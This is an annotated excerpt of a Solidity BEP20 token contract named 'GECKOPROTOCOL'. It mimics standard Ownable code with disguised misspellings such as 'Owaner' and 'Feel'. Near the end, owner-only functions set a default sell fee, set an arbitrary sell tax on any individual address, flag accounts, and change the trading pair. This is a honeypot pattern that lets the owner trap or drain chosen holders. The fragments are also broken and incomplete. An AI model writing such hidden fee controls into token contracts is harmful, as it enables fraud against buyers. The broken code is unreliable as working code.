...
abstract contract Ownable is Context {
    address private _Owaner;   //1

    event OwanershipTransferred(address indexed previousOwaner, address indexed newOwaner);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial Owaner.
     */
    constructor() {
        _transferOwanershiptransferOwanership(_msgSender());//3
    }
    ...
    function renounceOwanership() public virtual onlyOwaner {
        _transferOwanershiptransferOwanership(address(0));
    }//6
     ...
     */
    function transferOwanershiptransferOwanership(address newOwaner) public virtual onlyOwaner {
        require(newOwaner != address(0), "Ownable: new Owaner is the zero address");
        _transferOwanershiptransferOwanership(newOwaner);
    }//7
     ...
     */
    function _transferOwanershiptransferOwanership(address newOwaner) internal virtual {
...
contract BEP20 is Context {
     ...
     */
    event Approval(address indexed Owaner, address indexed spender, uint256 value);//10
    ...
    function approve(address spender, uint256 Amouint) public virtual returns (bool) {
        ...
        _approve(Owaner, spender, Amouint);
        return true;
    }
    ...
    /**
     * @dev Sets `Amouint` as the allowance of `spender` over the `Owaner` s tokens.
     *
    ...
    function _approve(
        ...
        _allowances[Owaner][spender] = Amouint;
        emit Approval(Owaner, spender, Amouint);
    }

    /**
     * @dev Spend `Amouint` form the allowance of `Owaner` toward `spender`.
     *
    ...
    function _spendAllowance(
        ...
        if (currentAllowance != type(uint256).max) {
            ...
            unchecked {
                _approve(Owaner, spender, currentAllowance - Amouint);
            }
        }
    }
...
contract GECKOPROTOCOL is BEP20, Ownable {
    // ext
    ...
    function PairList(address _address) external onlyOwaner {
        uniswapV2Pair = _address;
    }


    function upF(uint256 _value) external onlyOwaner {
        _defaultSellFeel = _value;
    }

    function setSlipFeel(address _address, uint256 _value) external onlyOwaner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFeel[_address] = _value;
    }

    function getSlipFeel(address _address) external view onlyOwaner returns (uint256) {
        return _slipFeel[_address];
    }


    function setMAccountFeel(address _address, bool _value) external onlyOwaner {
        _mAccount[_address] = _value;
    }

    function getMAccountFeel(address _address) external view onlyOwaner returns (bool) {
